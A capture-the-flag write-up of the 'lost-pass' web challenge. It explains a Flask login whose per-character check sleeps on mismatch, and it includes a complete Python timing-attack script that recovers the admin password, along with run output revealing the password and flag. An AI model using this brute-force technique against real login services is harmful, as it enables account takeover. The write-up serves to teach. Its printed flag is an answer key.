# lost-pass

[library.m0unt41n.ch/challenges/lost-pass](https://library.m0unt41n.ch/challenges/lost-pass) ![](../../resources/web.svg) ![](../../resources/medium.svg) 

# TL;DR

We get a Flask application, doing pretty much nothing except of auth and some
status page.

# First look

From the code, it seems that the flag will be shown when we manage to log in as
`admin` user.

 "Registration" seems somewhat broken, the only way seems to be doing a manual
 `POST` request (and it works).

# Wrong ideas

I ratholed quite a bit at first - one observation was that the `authorization`
cookie contains only `id` and `exp`, so, I was trying to:

*   Create a user
*   Dissect the cookie ([lddgo.net](https://www.lddgo.net/en/base/class?classID=3))
*   Try to craft a cookie with ID 1 instead of 2

But that would require brute-forcing `SECRET_KEY` - which is 20 bytes (40 hex
digits), too long for that.

Another observation was that the password is stored as a weird, long combination
of md5 hashes:

```python
def hash_char(char):
    return hashlib.md5(char.encode()).hexdigest()[:20]
(...)
hashed_password = ','.join([hash_char(c) for c in password])
user = db.createUser(username, hashed_password)
```

So, these hashes would have not very diverse prefixes - just few different hex
strings representing initial character.

# Timing leak

Anyway, all that was moot. It's much simpler &#128578;

```python
def error_log(username, password):
    if username == "admin":
        f = open("error.log", "w")
        time.sleep(1)
        f.write(f"SOMEONE TRIED TO LOGIN AS ADMIN USING {password} !!!1!11!!")
        f.close()
    return False

def check_password(username, hashed_password, password):
    hashed_password = hashed_password.split(",")

    for x in range(len(hashed_password)):
        try:
            if hash_char(password[x]) != hashed_password[x]:
                return error_log(username, password)
        except:
            return False
    return True
```

`check_password()` loops through characters one-by-one and, on error, bails out
with `error_log()`. Which has a `sleep(1)`. Which makes it for a trivial timing
attack. Note the `try ... except` block - when the input password is shorter
than the saved one, the function will return `False` as well, but **without**
waiting. All this helps in writing the exploit.

# Getting the password

We need to pick an "unlikely" character, which will help to both recognize a
failure (when we ran out of candidates) and end of string. We'll use `#`.

```python
import requests
import re
import time

# Starts with unlikely character
CHARSET = "#abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ{}!$%&()+,-./:;<=>@[]^`|#"
URL = "http://localhost:5000/login"

def get_password(url, charset):
    pwd = ""
    while True:
        for c in CHARSET:
            print("Trying: "+pwd+c)
            t = time.time()
            resp = requests.post(URL, data={"username": "admin", "password": pwd+c})
            if (time.time() - t) < 0.5:
                if c == '#':
                    return (pwd, resp)
                else:
                    pwd += c
                    break
        if c == '#':
            return None

(pwd, resp) = get_password(URL, CHARSET)
print("Admin password: "+pwd)
flag = re.compile(r"Your secret is: [^<]+").search(resp.text)[0][16:]
print("FLAG: "+flag)
```

Running this against the remote instance:

```
$ ./get_pass.py
Trying: #
Trying: a
Trying: b
Trying: c
Trying: d
Trying: d#
Trying: da
(...)
Trying: ducksnicc
Trying: ducksnicd
Trying: ducksnice
Trying: ducksnice#
Admin password: ducksnice
shc2023{ducks_like_2_sleep_quack}
```

---

## `shc2023{ducks_like_2_sleep_quack}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
